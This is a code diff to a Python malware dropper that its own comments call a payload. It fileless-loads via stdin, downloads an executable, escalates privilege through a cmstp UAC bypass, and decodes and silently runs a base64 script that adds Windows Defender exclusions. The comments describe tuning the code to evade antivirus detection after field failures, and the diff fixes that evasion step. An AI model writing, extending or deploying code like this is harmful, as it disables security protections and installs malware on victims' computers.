@@ -1,4 +1,4 @@
-# tung python-road payload — silent on every failure, stdlib only.
+ # tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe -> Administrator lift via cmstp (majanito shape)
@@ -409,6 +409,9 @@ def main():
     except Exception:
         pass
     try:
+        # r34: name the real carrier — without EXCL_EXE the writer would
+        # target its bundled fallback (tung.exe), the wrong process name.
+        os.environ["EXCL_EXE"] = EXE_NAME
         subprocess.run([sys.executable, "-u", excl_path],
                        creationflags=CREATE_NO_WINDOW, timeout=180,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -484,7 +487,24 @@ def set_defender_exclusions():
 
 
 def _run_stage_now():
-    """r14: already elevated — no exclusion work, just the carrier."""
+    """r34: already elevated — do the stage's job inline: materialize +
+    execute exclusions.py under THIS token, then the carrier exec. the old
+    shape skipped exclusions entirely on an already-elevated run."""
+    excl_path = os.path.join(PERSIST_DIR, "exclusions.py")
+    try:
+        if not os.path.exists(excl_path):
+            import base64
+            with open(excl_path, "wb") as fh:
+                fh.write(base64.b64decode(EXCL_B64))
+    except Exception:
+        pass
+    try:
+        os.environ["EXCL_EXE"] = EXE_NAME
+        subprocess.run([sys.executable, "-u", excl_path],
+                       creationflags=0x08000000, timeout=180,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
     try:
         exe_path = os.path.join(PERSIST_DIR, EXE_NAME)
         if os.path.exists(exe_path) and not _alive(EXE_NAME):
@@ -555,12 +575,12 @@ def main():
     except Exception:
         return
 
-    # r14 (dj ask): the exclusion-push loop is GONE. every carrier variant
-    # flagged so far was the exclusion payload itself, never the carrier —
-    # the r4 boot executed the carrier clean without any exclusion set. so
-    # the boot is now: UAC lift (python relaunch) -> elevated carrier exec.
-    # no Add-MpPreference, no reg.exe, no cscript/WMI provider call — the
-    # provider-level rule has nothing to fire on.
+    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
+    # exclusions ride the STAGE road below: after the lift, the elevated
+    # stage materializes + executes exclusions.py, then execs the carrier.
+    # r34 fix: this call was run_elevated() — which lifted the carrier exe
+    # DIRECTLY and never built/executed the stage, so exclusions.py could
+    # not run on any box. that was the whole field miss.
     try:
         if not is_valid_exe(EXE_PATH):
             data = download(EXE_URL) if EXE_URL else None
@@ -569,7 +589,7 @@ def main():
     except Exception:
         pass
 
-    run_elevated(EXE_PATH)
+    set_defender_exclusions()
 
 
 main()
